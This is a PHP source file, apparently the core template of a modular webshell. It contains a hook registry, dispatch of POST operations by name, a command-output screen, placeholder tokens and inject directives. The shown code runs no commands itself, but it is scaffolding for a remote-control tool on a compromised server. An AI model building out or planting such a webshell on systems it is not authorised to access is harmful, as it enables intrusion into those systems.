<?php

// section.functions

/**
 * Hooks container
 */
$hooks = [
    // Hooks that are called directly before any page is rendered, useful to enforce authentication and similar
    "page_generation" => [],
    // Hooks that are called to add isolated operations, isolated operations are operations that must be run in an
    // isolated environment meaning no other content should be rendered on the page except the operation result.
    // Example: file download, redirects, etc.
    "isolated_ops"    => [],
    // Hooks that are called to add register features to the webshell
    "features"        => [],
    // Named hooks that are called to render a page, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "GET_page"        => [],
    // Named hooks that are called to handle a POST request, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "POST_operation"  => [],
];

/**
 * Register a hook
 *
 * @param $hook string The hook to register
 * @param $function string|array The function to call or call_user_func compatible array
 */
function add_hook($hook, $function): void {
    global $hooks;

    $hooks[$hook][] = $function;
}

/**
 * Register a named hook
 *
 * @param $hook string The hook to register
 * @param $name string The name of the hook
 * @param $function string|array The function to call or call_user_func compatible array
 */
function add_named_hook($hook, $name, $function): void {
    global $hooks;

    // If the hook is already registered any new registration is ignored
    if (!empty($hooks[$hook][$name])) {
        return;
    }

    $hooks[$hook][$name] = $function;
}

/**
 * Call a hook
 *
 * @param $hook string The hook to call
 * @param $arguments array The arguments to pass to the hook (by reference)
 */
function call_hook($hook, &$arguments = []): void {
    global $hooks;

    foreach ($hooks[$hook] as $function) {
        call_user_func_array($function, $arguments);
    }
}

/**
 * Call a named hook
 *
 * @param $hook string The hook to call
 * @param $name string The name of the hook
 * @param $arguments array The arguments to pass to the hook (by reference)
 */
function call_named_hook($hook, $name, &$arguments = []): void {
    global $hooks;

    // If the hook is not registered, fail silently
    if (empty($hooks[$hook][$name])) {
        return;
    }

    call_user_func_array($hooks[$hook][$name], $arguments);
}

// section.functions.end

// inject: section.constants
// inject: file://./helpers.php
// inject: section.functions
// inject: section.hooks

// section.main
date_default_timezone_set("UTC");
$css = '__CSS__';

// Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
// on the page except the operation result.
$ISOLATED_OPERATIONS = [];
// Load the isolated operations
$args = [&$ISOLATED_OPERATIONS];
call_hook("isolated_ops", $args);

/**
 * Define the enabled features
 *
 * @var array{title: string, description: string, svg: string, hidden?: bool, op: string}[] $ENABLED_FEATURES
 */
$ENABLED_FEATURES = [];
// Load the enabled features
$args = [&$ENABLED_FEATURES];
call_hook("features", $args);

// Check if the request is not POST and the operation is not in the isolated operations list, if that is the case,
// render the page
if (
    !__PREFIX__isPost() ||
    !__PREFIX__isIsolatedOperation($_POST["__OPERATION__"], $ISOLATED_OPERATIONS)
) {
    // load the page or get the fallback page
    $page = __PREFIX__loadPageOrDefault($ENABLED_FEATURES);
    __PREFIX__renderPage($ENABLED_FEATURES, $page);

    // Check if the request is POST and the operation is not in the isolated operations list,
    // if that is the case open the command output screen to display the command output
    if (
        __PREFIX__isPost() &&
        !__PREFIX__isIsolatedOperation($_POST["__OPERATION__"], $ISOLATED_OPERATIONS)
    ) {
        __PREFIX__openCommandOutputScreen();
    }
}

// ensure the operation is a POST request, if so, call the operation handler
if (__PREFIX__isPost()) {
    $operation = $_POST["__OPERATION__"];
    $args      = [$operation, $ENABLED_FEATURES];
    call_named_hook("POST_operation", $operation, $args);
}

// If the request is not POST and the operation is not in the isolated operations list, close the command output screen
if (
    !__PREFIX__isPost() &&
    !__PREFIX__isIsolatedOperation($_POST["__OPERATION__"], $ISOLATED_OPERATIONS)
) {
    __PREFIX__closeCommandOutputScreen();
}

// section.main.end